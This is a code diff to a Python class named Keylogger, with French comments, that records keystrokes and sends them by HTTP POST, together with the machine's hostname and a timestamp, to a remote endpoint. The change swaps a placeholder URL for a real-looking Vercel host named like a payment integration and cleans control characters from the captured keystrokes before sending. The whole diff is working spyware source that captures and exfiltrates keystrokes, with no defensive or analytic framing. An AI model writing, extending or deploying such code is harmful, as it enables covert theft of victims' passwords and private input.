@@ -9,7 +9,7 @@ class Keylogger:
     def __init__(self):
         self.logs = ""
         self.machine_id = socket.gethostname()
-        self.api_url = "VOTRE_URL_VERCEL_API"
+        self.api_url = "paydunya-integration-mhvv.vercel.app"
         
     def on_press(self, key):
         try:
@@ -31,14 +31,19 @@ class Keylogger:
         data = {
             "machine_id": self.machine_id,
             "timestamp": datetime.now().isoformat(),
-            "keystrokes": self.logs
+            "keystrokes": self.logs.replace('\x03', '<CTRL-C>').replace('\x01', '<CTRL-A>')  # Nettoyage des caractères spéciaux
         }
+        
+        print(f"Tentative d'envoi des données: {data}")
         
         try:
             response = requests.post(
                 self.api_url,
                 json=data,
-                headers={"Content-Type": "application/json"}
+                headers={
+                    "Content-Type": "application/json",
+                    "Accept": "application/json"
+                }
             )
             if response.status_code == 200:
                 self.logs = ""  # Réinitialise les logs après envoi réussi
